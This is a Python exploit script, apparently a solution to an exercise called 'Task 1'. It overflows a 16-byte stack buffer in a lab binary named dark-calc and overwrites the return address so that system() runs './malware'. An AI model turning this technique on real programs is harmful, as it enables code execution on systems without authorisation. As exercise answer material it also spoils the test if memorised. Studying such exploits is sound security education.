#!/usr/bin/env python3
"""Task 1: ret2system call site in attack/dark-calc.

`input()` keeps its 16-byte buffer at rbp-0x10.  The saved rbp is at
rbp+0 and the return address at rbp+8.  We put a NUL-terminated command
at the start of the buffer, so input()'s strcpy() copies exactly
"./malware" into the global command_buf.  The overwritten return address
then jumps to eval()+0x94 (0x401a6b), i.e. the instruction that loads
command_buf into rdi and calls system(), skipping eval()'s wrapper code.
"""
import struct
import sys


def p64(x: int) -> bytes:
    return struct.pack("<Q", x)


cmd = b"./malware\x00"
buf = cmd + b"A" * (16 - len(cmd))
payload = buf + p64(0x4242424242424242) + p64(0x401A6B)

assert b"\n" not in payload
sys.stdout.buffer.write(payload)
